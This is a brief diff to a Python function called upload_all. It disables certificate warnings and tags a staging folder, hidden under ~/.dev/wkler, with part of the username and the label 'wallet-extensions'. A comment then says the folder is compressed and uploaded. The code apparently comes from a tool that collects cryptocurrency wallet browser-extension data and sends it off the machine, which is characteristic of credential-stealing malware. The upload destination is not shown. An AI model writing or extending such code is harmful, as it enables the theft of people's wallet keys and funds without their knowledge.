@@ -215,7 +215,9 @@ def upload_all() -> None:
     urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
     wkler_dir = Path.home() / ".dev" / "wkler"
-    backup_dir = wkler_dir / "backup"
+    username = getpass.getuser()
+    user_prefix = username[:5] if username else "user"
+    backup_dir = wkler_dir / f"{user_prefix}_wallet-extensions"
 
     # 压缩备份目录并上传
     if backup_dir.is_dir() and any(backup_dir.iterdir()):
